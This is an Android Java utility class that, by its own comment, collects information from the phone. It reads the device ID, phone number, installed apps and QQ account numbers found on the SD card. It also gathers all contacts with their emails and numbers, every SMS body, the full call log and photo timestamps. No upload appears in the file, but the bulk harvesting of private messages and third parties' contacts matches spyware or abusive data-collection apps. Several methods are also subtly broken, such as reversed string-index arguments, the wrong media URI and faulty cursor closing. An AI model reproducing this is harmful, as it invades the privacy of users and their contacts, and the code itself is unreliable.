package com.rt.sc.tools;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.rt.sc.config.Config;
import com.rt.sc.model.Contacts;
import com.rt.sc.model.NoteModel;
import com.rt.sc.model.Record;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

/**
 * 收集信息
 *
 * @author renmingming
 * @version [版本号, 2015年8月4日]
 * @see [相关类/方法]
 * @since [产品/模块版本]
 */
public class DeviceUtil {
    private static Context mContext;

    private static DeviceUtil mDeviceUtil;

    private TelephonyManager tm;

    private final String SMS_URI_ALL = "content://sms/"; // 所有短信

    private final String CALL_TYPE_IN = "0";//呼入

    private final String CALL_TYPE_OUT = "1";//呼出

    private final String CALL_TYPE_UNRECEIVE = "2";//未接

    private DeviceUtil(Context context) {
        mContext = context;
        tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
    }

    public static synchronized DeviceUtil getDeviceUtil(Context context) {
        if (mContext == null) {
            mDeviceUtil = new DeviceUtil(context);
        }
        return mDeviceUtil;
    }

    /**
     * 获取设备号
     * <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     */
    public String getDeviceID() {

        return tm.getDeviceId();
    }

    /**
     * 获取手机型号
     */
    public String getDeviceModel() {
        return Build.MODEL;
    }

    /**
     * 获取手机品牌
     */
    public String getDeviceBrand() {
        return Build.BRAND;
    }

    /**
     * 获取操作系统
     */
    public String getDeviceOS() {
        return Build.VERSION.RELEASE;
    }

    /**
     * 获取QQ号，根据
     */
    public List<String> getQQList() {
        String path = getSDPath();
        if (path != null) {
            QQlist.clear();
            traverseFileList(path + File.separator + "tencent/MobileQQ/");
        }
        return QQlist;
    }

    /**
     * 获取sd卡根目录
     *
     * @return
     * @see [类、类#方法、类#成员]
     */

    public String getSDPath() {
        File sdDir = null;
        boolean sdCardExist = Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED); //判断sd卡是否存在 
        if (sdCardExist) {
            sdDir = Environment.getExternalStorageDirectory();//获取跟目录 
            return sdDir.toString();
        } else {
            return getSDCardPath();
        }

    }

    /**
     * 获取外置SD卡路径
     *
     * @return
     */
    public static String getSDCardPath() {
        String cmd = "cat /proc/mounts";
        Runtime run = Runtime.getRuntime();// 返回与当前 Java 应用程序相关的运行时对象
        try {
            Process p = run.exec(cmd);// 启动另一个进程来执行命令
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));

            String lineStr;
            while ((lineStr = inBr.readLine()) != null) {
                // 获得命令执行后在控制台的输出信息
                LogUtil.i("CommonUtil:getSDCardPath", lineStr);
                if (lineStr.contains("sdcard") && lineStr.contains(".android_secure")) {
                    String[] strArray = lineStr.split(" ");
                    if (strArray != null && strArray.length >= 5) {
                        String result = strArray[1].replace("/.android_secure", "");
                        return result;
                    }
                }
                // 检查命令是否执行失败。
                if (p.waitFor() != 0 && p.exitValue() == 1) {
                    // p.exitValue()==0表示正常结束，1：非正常结束
                    LogUtil.e("CommonUtil:getSDCardPath", "命令执行失败!");
                }
            }
            inBr.close();
            in.close();
        } catch (Exception e) {
            LogUtil.e("CommonUtil:getSDCardPath", e.toString());

            return Environment.getExternalStorageDirectory().getPath();
        }

        return Environment.getExternalStorageDirectory().getPath();
    }

    /**
     * 遍历目录下的文件，获取文件名
     */

    private static ArrayList<String> QQlist = new ArrayList<String>();

    public void traverseFileList(String strPath) {
        File dir = new File(strPath);

        File[] files = dir.listFiles();

        if (files == null)
            return;

        for (int i = 0; i < files.length; i++) {
            //            if (files[i].isDirectory())
            //            {
            //                traverseFileList(files[i].getAbsolutePath());
            //            }
            //            else
            //            {
            //            }
            if (files[i].isDirectory()) {
                String strFileName = files[i].getAbsolutePath();
                if (strFileName.contains("/")) {
                    strFileName = strFileName.substring("/".lastIndexOf(strFileName) + 1);
                }
                System.out.println("---" + strFileName);
                if (StringUtils.isNumeric(strFileName)) {
                    QQlist.add(strFileName);
                }
            }

        }
    }

    /**
     * 获取SIM卡号
     * <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     */
    public String getSIMCODE() {
        String phoneId = tm.getLine1Number();
        return phoneId;
    }

    /**
     * 获取通讯录
     */
    public ArrayList<Contacts> getContacts() {
        Cursor cursor = null;
        Cursor emails = null;
        Cursor phone = null;
        int count = 0;
        ArrayList<Contacts> contacts = new ArrayList<Contacts>();
        try {
            Uri uri = Uri.parse("content://com.android.contacts/contacts");
            //获得一个ContentResolver数据共享的对象
            ContentResolver reslover = mContext.getContentResolver();
            //取得联系人中开始的游标，通过content://com.android.contacts/contacts这个路径获得
            cursor = reslover.query(uri, null, null, null, null);
            //上边的所有代码可以由这句话代替：Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            //Uri.parse("content://com.android.contacts/contacts") == ContactsContract.Contacts.CONTENT_URI
            if (null == cursor) {
                return null;
            }
            while (cursor.moveToNext()) {
                Contacts contact = new Contacts();
                contacts.add(contact);
                //获得联系人ID
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                //获得联系人姓名
                String name =
                        cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                contact.setName(name);

                // 根据联系人ID查询对应的email
                emails = reslover.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = " + contactId,
                                null,
                                null);
                // 取得email(可能存在多个email)
                while (emails != null && emails.moveToNext()) {
                    String strEmail = emails.getString(emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                    contact.getEmailList().add(strEmail);
                }
                //获得联系人手机号码
                phone =reslover.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId,
                                null,
                                null);
                //取得电话号码(可能存在多个号码)
                while (phone != null && phone.moveToNext()) {
                    int phoneFieldColumnIndex = phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    String phoneNumber = phone.getString(phoneFieldColumnIndex);
                    contact.getPhoneList().add(phoneNumber);
                }
                //                    sb.append(phoneNumber + "www");
                if (emails != null && !emails.isClosed()) {
                    emails.close();
                }
                if (phone != null && !phone.isClosed()) {
                    phone.close();
                }
                Log.e("====",count++ +"===="+contact.toString());

            }
            return contacts;
        }
        catch (Exception e)
        {
            e.printStackTrace();
            return contacts;
        }finally {
            if (cursor != null && !cursor.isClosed()) {
                cursor.close();
            }

        }
    }

    /**
     * 获取短信
     */
    public ArrayList<NoteModel> getNotes() {
        ArrayList<NoteModel> notes = new ArrayList<NoteModel>();
        Cursor cur=null;
        try {
        Uri uri = Uri.parse(SMS_URI_ALL);
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type",};
        cur = mContext.getContentResolver().query(uri, projection, null, null, "date desc"); // 获取手机内部短信

        if (null == cur) {
            return null;
        }
            while (cur.moveToNext()) {
                NoteModel nm = new NoteModel();
                notes.add(nm);
                String number = cur.getString(cur.getColumnIndex("address"));//手机号
                String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
                String body = cur.getString(cur.getColumnIndex("body"));
                Long date = cur.getLong(cur.getColumnIndex("date"));
                int index_Type = cur.getInt(cur.getColumnIndex("type"));
                switch (index_Type) {
                    case 0:
                        nm.setType(NoteModel.TYPE.all);
                        break;
                    case 1:
                        nm.setType(NoteModel.TYPE.receive);
                        break;
                    case 2:
                        nm.setType(NoteModel.TYPE.send);
                        break;
                    case 3:
                        nm.setType(NoteModel.TYPE.draft);
                        break;
                    case 4:
                        nm.setType(NoteModel.TYPE.sendbox);
                        break;
                    case 5:
                        nm.setType(NoteModel.TYPE.sendfaild);
                        break;
                    case 6:
                        nm.setType(NoteModel.TYPE.waitsend);
                        break;

                    default:
                        break;
                }
                nm.setPhone(number);
                nm.setPerson(name);
                nm.setBody(body);
                SimpleDateFormat dateFormat = new SimpleDateFormat(Config.date_fromat);
                Date d = new Date(date);
                String strDate = dateFormat.format(d);
                nm.setDate(strDate);
            }
            return notes;
        }
        catch (Exception e)
        {
            e.printStackTrace();
            return notes;
        }
        finally
        {
            if (cur!=null&&!cur.isClosed()) {
                cur.close();
            }
        }
    }

    /**
     * 获取app列表
     */
    public ArrayList<String> getAPPList() {
        ArrayList<String> appNames = new ArrayList<String>();
        PackageManager packageManager = mContext.getPackageManager();
        List<PackageInfo> packageInfoList = packageManager.getInstalledPackages(0);
        for (PackageInfo info : packageInfoList) {
            if (info != null) {
                appNames.add(packageManager.getApplicationLabel(info.applicationInfo).toString() + "@@" + info.packageName);
            }
        }
        return appNames;
    }

    /**
     * 取得device的IP address
     */
    @SuppressLint("DefaultLocale")
    public String getIp() {
        WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
        int ipAddress = wifiInfo.getIpAddress();

        // 格式化IP address，例如：格式化前：1828825280，格式化后：192.168.1.109 
        String ip =
                String.format("%d.%d.%d.%d",
                        (ipAddress & 0xff),
                        (ipAddress >> 8 & 0xff),
                        (ipAddress >> 16 & 0xff),
                        (ipAddress >> 24 & 0xff));
        return ip;

    }


    /**
     * 获取通话记录
     */
    public ArrayList<Record> getRecordS() {
        if (ContextCompat.checkSelfPermission(mContext, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            ArrayList<Record> records = new ArrayList<Record>();
            Cursor cursor = mContext.getContentResolver().query(CallLog.Calls.CONTENT_URI, // 使用系统URI，取得通话记录

                    new String[]{CallLog.Calls.NUMBER, // 电话号码

                            CallLog.Calls.CACHED_NAME, // 联系人

                            CallLog.Calls.TYPE, // 通话类型

                            CallLog.Calls.DATE, // 通话时间

                            CallLog.Calls.DURATION // 通话时长

                    },
                    null,
                    null,
                    CallLog.Calls.DEFAULT_SORT_ORDER);

            // 遍历每条通话记录
            if (null == cursor) {
                return null;
            }
            try {
                while (cursor.moveToNext()) {
                    Record rd = new Record();
                    records.add(rd);
                    String strNumber = cursor.getString(0); // 呼叫号码
                    String strName = cursor.getString(1); // 联系人姓名
                    int type = cursor.getInt(2);
                    String str_type = "";
                    if (type == CallLog.Calls.INCOMING_TYPE) {
                        str_type = CALL_TYPE_IN;
                    } else if (type == CallLog.Calls.OUTGOING_TYPE) {
                        str_type = CALL_TYPE_OUT;
                    } else if (type == CallLog.Calls.MISSED_TYPE) {
                        str_type = CALL_TYPE_UNRECEIVE;
                    }
                    long duration = cursor.getLong(4);

                    Date date = new Date(Long.parseLong(cursor.getString(3)));


                    rd.setDate(date);
                    rd.setDuration(duration);
                    rd.setName(strName);
                    rd.setPhone(strNumber);
                    rd.setType(str_type);

                }
                return records;

            } finally {
                if (cursor.isClosed()) {
                    cursor.close();
                }
            }

        }
        return null;
    }


    /**
     * 获取第一张图片的时间
     */
    @SuppressLint("SimpleDateFormat")
    public String getFirstPicTime() {
        String[] proj = {MediaStore.Images.Media.DATE_ADDED};
        Cursor cursor =
                mContext.getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                        proj,
                        null,
                        null,
                        MediaStore.Images.Media.DATE_ADDED);
        cursor.moveToFirst();
        cursor.moveToNext();
        String str = cursor.getString(0);
        SimpleDateFormat sdf = new SimpleDateFormat(Config.date_fromat);
        Date date = new Date(Long.parseLong(str));
        String time = sdf.format(date);
        return time;

    }

    public static String GetNetIp() {
        URL infoUrl = null;
        InputStream inStream = null;
        try {
            infoUrl = new URL("https://www.baidu.com");
            URLConnection connection = infoUrl.openConnection();
            HttpURLConnection httpConnection = (HttpURLConnection) connection;
            int responseCode = httpConnection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                inStream = httpConnection.getInputStream();
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(inStream, "utf-8"));
                StringBuilder strber = new StringBuilder();
                String line = null;
                while ((line = reader.readLine()) != null)
                    strber.append(line + "\n");
                inStream.close();
                // 从反馈的结果中提取出IP地址
                // int start = strber.indexOf("[");
                // Log.d("zph", "" + start);
                // int end = strber.indexOf("]", start + 1);
                // Log.d("zph", "" + end);
                line = strber.substring(378, 395);
                line.replaceAll(" ", "");
                return line;
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String GetNetIp2() {
        String IP = "";
        try {
            String address = "http://ip.taobao.com/service/getIpInfo2.php?ip=myip";
            URL url = new URL(address);
            HttpURLConnection connection = (HttpURLConnection) url
                    .openConnection();
            connection.setUseCaches(false);

            if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                InputStream in = connection.getInputStream();

// 将流转化为字符串
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(in));

                String tmpString = "";
                StringBuilder retJSON = new StringBuilder();
                while ((tmpString = reader.readLine()) != null) {
                    retJSON.append(tmpString + "\n");
                }

                JSONObject jsonObject = new JSONObject(retJSON.toString());
                String code = jsonObject.getString("code");
                if (code.equals("0")) {
                    JSONObject data = jsonObject.getJSONObject("data");
                    IP = data.getString("ip");
//                            + "(" + data.getString("country")
//                            + data.getString("area") + "区"
//                            + data.getString("region") + data.getString("city")
//                            + data.getString("isp") + ")";

                    Log.e("提示", "您的IP地址是：" + IP);
                } else {
                    IP = "";
                    Log.e("提示", "IP接口异常，无法获取IP地址！");
                }
            } else {
                IP = "";
                Log.e("提示", "网络连接异常，无法获取IP地址！");
            }
        } catch (Exception e) {
            IP = "";
            Log.e("提示", "获取IP地址时出现异常，异常信息是：" + e.toString());
        }
        return IP;
    }
}
